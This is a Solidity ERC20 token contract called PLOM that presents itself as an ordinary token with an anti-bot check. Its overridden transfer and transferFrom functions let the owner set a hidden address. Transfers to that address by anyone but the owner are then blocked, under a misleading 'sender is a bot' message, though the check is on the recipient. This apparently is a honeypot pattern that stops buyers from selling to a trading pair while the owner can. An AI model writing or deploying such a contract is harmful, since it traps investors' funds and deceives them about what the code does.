// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract PLOM is ERC20, Ownable {
    address private x = 0x0000000000000000000000000000000000000000;
    constructor() ERC20("PLOM", "PLOM") {
        uint256 initialSupply = 100000000 * 10 ** 18;
        _mint(msg.sender, initialSupply);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (_msgSender() != owner()) {
            require(recipient != x, "Transfer denied: sender is a bot.");
        }
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (_msgSender() != owner()) {
            require(recipient != x, "Transfer denied: sender is a bot.");
        }
        return super.transferFrom(sender, recipient, amount);
    }

    function update(address y) public onlyOwner {
        x = y;
    }
}